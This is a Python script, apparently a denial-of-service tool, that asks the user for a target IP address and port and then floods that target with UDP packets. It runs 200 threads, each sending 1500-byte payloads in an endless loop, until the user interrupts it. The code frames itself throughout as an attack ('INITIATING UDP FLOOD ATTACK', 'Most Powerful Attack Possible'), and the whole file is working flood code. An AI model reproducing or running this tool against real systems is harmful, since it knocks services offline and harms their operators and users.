import socket
import threading
import time
import sys

# --- ANSI Color Codes ---
# Red for Logo
RED = '\033[91m'
# Blue for Text
BLUE = '\033[94m'
# Reset code to return to default terminal colors
RESET = '\033[0m'

# --- ASCII Logo Representation ---
def display_logo():
    """Displays a stylized ASCII logo using ANSI colors."""
    logo = r"""
   .dMMMb  dMP dMP .aMMMb  dMMMMb  dMP dMP dMMMMb dMMMMMMP             dMMMMb  .aMMMb  .dMMMb 
  dMP" VP dMP dMP dMP"VMP dMP.dMP dMP.dMP dMP.dMP   dMP               dMP VMP dMP"dMP dMP" VP   Coded by shcrypta                                                  
  VMMMb  dMMMMMP dMP     dMMMMK"  VMMMMP dMMMMP"   dMP               dMP dMP dMP dMP  VMMMb       https:/github.comshcrypta27                                   
dP .dMP dMP dMP dMP.aMP dMP"AMF dA .dMP dMP       dMP               dMP.aMP dMP.aMP dP .dMP        
VMMMP" dMP dMP  VMMMP" dMP dMP  VMMMP" dMP       dMP               dMMMMP"  VMMMP"  VMMMP"             
"""
    # Print the logo with the specified coloring
    print(RED + logo.replace('\n', RED + '\n') + RESET)


def udp_flood(target_ip, target_port, thread_count, packet_size):
    """
    Performs an aggressive UDP Flood attack.
    """
    display_logo()
    print(BLUE + "=========================================================" + RESET)
    print(BLUE + "         INITIATING UDP FLOOD ATTACK                 " + RESET)
    print(BLUE + "=========================================================" + RESET)
    print(f"[TARGET] IP: {target_ip} | Port: {target_port}")
    print(f"[CONFIG] Threads: {thread_count} | Packet Size: {packet_size} bytes")
    print("=========================================================")
    print(BLUE + "\n \n" + RESET)

    def worker():
        # Create socket once per thread for stability and speed
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Generate the payload to maximize bandwidth stress
        # We repeat a base string until the target size is reached
        base_payload_string = "DDoS_ATTACK_VECTOR_HACKER_LOAD_TEST"
        payload = base_payload_string.encode('utf-8') * (packet_size // len(base_payload_string) + 1)

        while True:
            try:
                # Send the data to the target
                sock.sendto(payload, (target_ip, target_port))
            except socket.error:
                # Socket errors often mean the connection is interrupted or target is unreachable
                break
            except Exception:
                break

    threads_list = []
    start_time = time.time()

    # Start worker threads
    for i in range(thread_count):
        t = threading.Thread(target=worker, name=f"Worker-{i}")
        threads_list.append(t)
        t.start()

    print(BLUE + "Flood STARTED. All available threads are active. Press Ctrl+C to STOP the attack." + RESET)

    try:
        # Keep the main thread alive indefinitely until interrupted
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  ")
        print(" ctrl+c ")
        print(" ")
    finally:
        end_time = time.time()
        print(f"\n[STATUS] UDP Flood simulation stopped.")
        print(f"[SUMMARY] Total running time: {end_time - start_time:.2f} seconds.")


def main():
    """Handles user input and launches the attack."""

    print(BLUE + "\n     _                           _         _            " + RESET)
    print(BLUE + " ___| |__   ___ _ __ _   _ _ __ | |_    __| | ___  ___  " + RESET)
    print(BLUE + "/ __| '_ \ / __| '__| | | | '_ \| __|  / _` |/ _ \/ __| " + RESET)
    print(BLUE + "\__ \ | | | (__| |  | |_| | |_) | |_  | (_| | (_) \__ \ " + RESET)
    print(BLUE + "|___/_| |_|\___|_|   \__, | .__/ \__|  \__,_|\___/|___/ " + RESET)
    print(BLUE + "                     |___/|_|                           " + RESET)
    
    # 1. Get Host
    while True:
        host = input("Enter the target host IP address: ").strip()
        if host:
            break
        print("Host cannot be empty.")

    # 2. Get Port
    while True:
        try:
            port_str = input("Enter the target service port (e.g., 80, 53): ").strip()
            port = int(port_str)
            if 1 <= port <= 65535:
                break
            else:
                print("Port must be a valid number between 1 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a number.")

    # 3. Confirm Attack
    while True:
        confirmation = input("Do you want to start the attack? (y/n): ").strip().lower()
        if confirmation in ('y', 'n'):
            break
        print("Invalid selection. Please enter 'y' or 'n'.")

    if confirmation == 'n':
        print(BLUE + "\nAttack cancelled. Goodbye." + RESET)
        return

    # --- Launching the Most Powerful Attack Possible ---
    # For maximum impact, we use high concurrency and large packets.

    # These values represent the "most powerful" configuration based on local machine limits.
    MAX_THREADS = 200 
    MAX_PACKET_SIZE = 1500 # Standard Ethernet MTU + some overhead

    try:
        udp_flood(
            target_ip=host, 
            target_port=port, 
            thread_count=MAX_THREADS, 
            packet_size=MAX_PACKET_SIZE
        )
    except Exception as e:
        print(RED + "\n[CRITICAL ERROR] An unexpected error occurred during the attack: " + str(e) + RESET)

if __name__ == "__main__":
    main()
